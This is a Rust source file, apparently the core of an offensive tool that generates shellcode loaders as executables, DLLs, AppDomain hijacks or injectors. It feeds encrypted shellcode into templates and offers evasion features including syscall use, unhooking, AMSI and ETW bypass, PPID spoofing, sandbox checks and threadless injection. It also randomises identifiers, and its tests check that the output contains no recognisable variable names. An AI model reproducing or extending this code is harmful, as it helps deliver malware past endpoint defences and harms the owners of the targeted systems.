use rand::{distributions::Alphanumeric, Rng};
use serde::Serialize;
use tera::{Context, Tera, Value};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum LoaderType { Binary, Dll, AppDomain, Injector }

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Feature {
    DirectSyscall, UnhookDisk, UnhookKnownDlls, ModuleStomp,
    SleepEncrypt, StackSpoof,
    SandboxDomain, SandboxUser, PpidSpoof,
    AmsiHwbp, EtwHwbp,
    PeSpoofing, Staged, AppDomain, ThreadlessInject,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Encryption { Aes256, Chacha20 }

#[derive(Debug, Clone, Serialize)]
pub struct PeConfig {
    pub company: String,
    pub file_description: String,
    pub product_name: String,
    pub sign: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainConfig {
    pub clr_version: String,
    pub net_version: String,
    pub target_process: String,
    pub assembly_hex: String,
    pub type_name: String,
    pub method_name: String,
    pub appdomain_name: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct LoaderConfig {
    pub loader_type: LoaderType,
    pub features: Vec<Feature>,
    pub encryption: Encryption,
    pub shellcode_hex: String,
    pub key_hex: String,
    pub iv_hex: String,
    pub pe_config: Option<PeConfig>,
    pub appdomain_config: Option<AppDomainConfig>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainTemplateConfig {
    pub clr_version: String,
    pub net_version: String,
    pub appdomain_name: String,
}

fn rand_ident(len: usize) -> String {
    let mut rng = rand::thread_rng();
    let first: char = rng.gen_range(b'a'..=b'z') as char;
    let rest: String = (0..len.saturating_sub(1))
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();
    format!("{}{}", first, rest)
}

fn make_rand_ident_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(12) as usize;
        Ok(Value::String(rand_ident(len)))
    }
}

fn make_rand_hex_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(8) as usize;
        let s: String = (0..len)
            .map(|_| format!("{:02x}", rand::thread_rng().gen::<u8>()))
            .collect();
        Ok(Value::String(s))
    }
}

fn make_hex_bytes_filter() -> impl tera::Filter {
    move |value: &Value, _: &HashMap<String, Value>| {
        let hex = value.as_str().ok_or_else(|| tera::Error::msg("expected string"))?;
        let bytes: Vec<u8> = (0..hex.len())
            .step_by(2)
            .filter_map(|i| u8::from_str_radix(&hex[i..i+2], 16).ok())
            .collect();
        let json_bytes: Vec<Value> = bytes.iter().map(|&b| Value::Number(b.into())).collect();
        Ok(Value::Array(json_bytes))
    }
}

pub fn generate_loader_source(config: &LoaderConfig) -> Result<String, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir)
        .map_err(|e| e.to_string())?;

    tera.register_function("rand_ident", make_rand_ident_fn());
    tera.register_function("rand_hex",   make_rand_hex_fn());
    tera.register_filter("hex_bytes",    make_hex_bytes_filter());

    let mut ctx = Context::new();
    ctx.insert("config", config);

    let vars: HashMap<&str, String> = [
        "var_shellcode", "var_key", "var_iv", "var_ptr",
        "var_region", "var_fiber", "fn_run", "fn_setup",
    ].iter().map(|&k| (k, rand_ident(12))).collect();
    ctx.insert("v", &vars);

    let feature_names: Vec<String> = config.features.iter()
        .map(|f| format!("{:?}", f))
        .collect();
    ctx.insert("feature_names", &feature_names);

    let template_name = match config.loader_type {
        LoaderType::Binary    => "binary.rs.tera",
        LoaderType::Dll       => "dll.rs.tera",
        LoaderType::AppDomain => "appdomain.rs.tera",
        LoaderType::Injector  => "injector.rs.tera",
    };

    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir).map_err(|e| e.to_string())?;
    let mut ctx = Context::new();
    ctx.insert("clr_version",    &config.clr_version);
    ctx.insert("net_version",    &config.net_version);
    ctx.insert("appdomain_name", &config.appdomain_name);
    tera.render("appdomain.config.tera", &ctx).map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_binary_no_plain_identifiers() {
        let config = LoaderConfig {
            loader_type: LoaderType::Binary,
            features: vec![Feature::SleepEncrypt, Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "deadbeef".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
        };
        let result = generate_loader_source(&config).unwrap();
        assert!(!result.contains("let shellcode "));
        assert!(!result.contains("let key "));
        assert!(result.contains("de") || result.contains("ad")); // shellcode bytes present
    }

    #[test]
    fn test_appdomain_config_xml() {
        let config = AppDomainTemplateConfig {
            clr_version: "v4.0.30319".into(),
            net_version: "4.0".into(),
            appdomain_name: "DefaultDomain".into(),
        };
        let xml = generate_appdomain_config(&config).unwrap();
        assert!(xml.contains("v4.0.30319"));
        assert!(xml.contains("DefaultDomain"));
        assert!(xml.contains("<configuration>"));
    }

    #[test]
    fn test_dll_template_has_dll_main() {
        let config = LoaderConfig {
            loader_type: LoaderType::Dll,
            features: vec![Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "cafebabe".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
        };
        let source = generate_loader_source(&config).unwrap();
        assert!(source.contains("DllMain"));
        assert!(source.contains("DllRegisterServer"));
    }
}
